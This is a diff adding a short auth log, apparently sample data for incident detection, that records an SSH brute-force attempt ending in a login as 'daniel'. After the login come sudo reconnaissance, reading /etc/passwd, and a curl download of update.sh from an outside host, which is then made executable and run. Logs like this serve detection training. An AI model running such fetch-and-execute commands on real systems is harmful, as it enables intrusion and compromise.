@@ -1,0 +1,20 @@
+2026-09-30T09:10:03 WEB-SRV-01 sshd[2141]: Failed password for invalid user admin from 203.0.113.45 port 51231 ssh2
+2026-09-30T09:10:18 WEB-SRV-01 sshd[2145]: Failed password for invalid user admin from 203.0.113.45 port 51244 ssh2
+2026-09-30T09:10:31 WEB-SRV-01 sshd[2149]: Failed password for invalid user administrator from 203.0.113.45 port 51258 ssh2
+2026-09-30T09:11:02 WEB-SRV-01 sshd[2156]: Failed password for invalid user root from 203.0.113.45 port 51302 ssh2
+2026-09-30T09:11:17 WEB-SRV-01 sshd[2160]: Failed password for invalid user admin from 203.0.113.45 port 51318 ssh2
+2026-09-30T09:11:33 WEB-SRV-01 sshd[2164]: Failed password for invalid user test from 203.0.113.45 port 51337 ssh2
+2026-09-30T09:12:05 WEB-SRV-01 sshd[2171]: Failed password for invalid user ubuntu from 203.0.113.45 port 51369 ssh2
+2026-09-30T09:12:29 WEB-SRV-01 sshd[2178]: Failed password for invalid user admin from 203.0.113.45 port 51394 ssh2
+2026-09-30T09:13:11 WEB-SRV-01 sshd[2185]: Failed password for daniel from 203.0.113.45 port 51431 ssh2
+2026-09-30T09:13:26 WEB-SRV-01 sshd[2189]: Failed password for daniel from 203.0.113.45 port 51447 ssh2
+2026-09-30T09:13:49 WEB-SRV-01 sshd[2194]: Failed password for daniel from 203.0.113.45 port 51462 ssh2
+2026-09-30T09:14:07 WEB-SRV-01 sshd[2198]: Accepted password for daniel from 203.0.113.45 port 51479 ssh2
+2026-09-30T09:14:08 WEB-SRV-01 sshd[2198]: pam_unix(sshd:session): session opened for user daniel
+2026-09-30T09:14:42 WEB-SRV-01 sudo[2210]: daniel : TTY=pts/0 ; PWD=/home/daniel ; USER=root ; COMMAND=/usr/bin/whoami
+2026-09-30T09:15:03 WEB-SRV-01 sudo[2216]: daniel : TTY=pts/0 ; PWD=/home/daniel ; USER=root ; COMMAND=/usr/bin/cat /etc/passwd
+2026-09-30T09:15:31 WEB-SRV-01 sudo[2224]: daniel : TTY=pts/0 ; PWD=/home/daniel ; USER=root ; COMMAND=/usr/bin/find / -name "*.conf"
+2026-09-30T09:16:14 WEB-SRV-01 sudo[2231]: daniel : TTY=pts/0 ; PWD=/home/daniel ; USER=root ; COMMAND=/usr/bin/curl http://198.51.100.27/update.sh -o /tmp/update.sh
+2026-09-30T09:16:39 WEB-SRV-01 sudo[2238]: daniel : TTY=pts/0 ; PWD=/home/daniel ; USER=root ; COMMAND=/usr/bin/chmod +x /tmp/update.sh
+2026-09-30T09:16:51 WEB-SRV-01 sudo[2242]: daniel : TTY=pts/0 ; PWD=/home/daniel ; USER=root ; COMMAND=/tmp/update.sh
+2026-09-30T09:17:36 WEB-SRV-01 sshd[2198]: pam_unix(sshd:session): session closed for user daniel
